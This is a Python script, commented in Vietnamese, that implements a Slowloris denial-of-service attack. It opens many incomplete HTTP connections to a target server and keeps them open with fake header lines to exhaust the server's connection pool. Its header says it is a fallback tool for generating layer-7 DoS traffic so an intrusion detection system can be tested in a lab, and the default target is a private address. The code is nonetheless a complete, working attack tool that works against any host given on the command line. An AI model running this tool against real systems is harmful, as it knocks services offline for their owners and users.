#!/usr/bin/env python3
"""
=============================================================================
Tên file   : slowloris_fallback.py
Mục tiêu   : Fallback Slowloris attack khi không có slowhttptest.
             Giữ nhiều kết nối HTTP mở → exhaust server connection pool.
Input      : TARGET IP, số kết nối, thời gian giữ.
Output     : HTTP connections chậm → IDPS phải phát hiện DoS Layer 7.
Ngày tạo   : 2026-06-06
Ngày sửa   : —
Lí do sửa  : —
=============================================================================
"""

import socket
import time
import random
import sys
import argparse

DEFAULT_TARGET = "172.16.1.2"
DEFAULT_PORT = 80
DEFAULT_CONNECTIONS = 150
DEFAULT_DURATION = 60  # giây


def log(msg: str):
    ts = time.strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")


def create_connection(target: str, port: int) -> socket.socket:
    """Tạo 1 kết nối HTTP partial (không hoàn tất request)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    s.connect((target, port))

    # Gửi HTTP request KHÔNG HOÀN CHỈNH (thiếu \r\n cuối → server chờ mãi)
    s.send(f"GET /?{random.randint(1,99999)} HTTP/1.1\r\n".encode())
    s.send(f"Host: {target}\r\n".encode())
    s.send(f"User-Agent: Mozilla/5.0 (Slowloris Test {random.randint(1,999)})\r\n".encode())
    s.send(f"Accept-Language: en-US,en;q=0.5\r\n".encode())
    # KHÔNG gửi \r\n cuối cùng → server đợi header tiếp
    return s


def keep_alive(sockets: list, target: str, port: int):
    """Gửi header giả để giữ kết nối sống."""
    alive = 0
    dead_indices = []

    for i, s in enumerate(sockets):
        try:
            # Gửi thêm 1 header line (giữ connection alive)
            s.send(f"X-Keepalive-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
            alive += 1
        except (BrokenPipeError, ConnectionResetError, OSError):
            dead_indices.append(i)

    # Thay thế kết nối chết
    for i in reversed(dead_indices):
        try:
            sockets[i].close()
        except:
            pass
        try:
            sockets[i] = create_connection(target, port)
            alive += 1
        except (ConnectionRefusedError, socket.timeout, OSError):
            pass

    return alive


def main():
    parser = argparse.ArgumentParser(description="Slowloris Fallback (Python) for IDPS Testing")
    parser.add_argument("--target", default=DEFAULT_TARGET, help="Target IP")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="Target port")
    parser.add_argument("--connections", type=int, default=DEFAULT_CONNECTIONS, help="Number of connections")
    parser.add_argument("--duration", type=int, default=DEFAULT_DURATION, help="Duration in seconds")
    args = parser.parse_args()

    log(f"Slowloris: {args.target}:{args.port}")
    log(f"Connections: {args.connections}, Duration: {args.duration}s")
    log("=" * 50)

    # Phase 1: Mở tất cả kết nối
    sockets = []
    log(f"Đang mở {args.connections} kết nối...")
    for i in range(args.connections):
        try:
            s = create_connection(args.target, args.port)
            sockets.append(s)
        except (ConnectionRefusedError, socket.timeout, OSError) as e:
            if i == 0:
                log(f"Không thể kết nối: {e}")
                sys.exit(1)
            break

    log(f"Đã mở {len(sockets)} kết nối. Bắt đầu giữ alive...")

    # Phase 2: Giữ kết nối sống trong duration giây
    start = time.time()
    cycle = 0
    while time.time() - start < args.duration:
        cycle += 1
        alive = keep_alive(sockets, args.target, args.port)
        elapsed = int(time.time() - start)
        log(f"  Cycle {cycle}: {alive}/{len(sockets)} alive | {elapsed}s/{args.duration}s")
        time.sleep(random.uniform(5, 15))  # Gửi keep-alive mỗi 5-15s

    # Cleanup
    log("Đóng tất cả kết nối...")
    for s in sockets:
        try:
            s.close()
        except:
            pass

    log(f"Slowloris hoàn tất sau {int(time.time()-start)}s.")


if __name__ == "__main__":
    main()
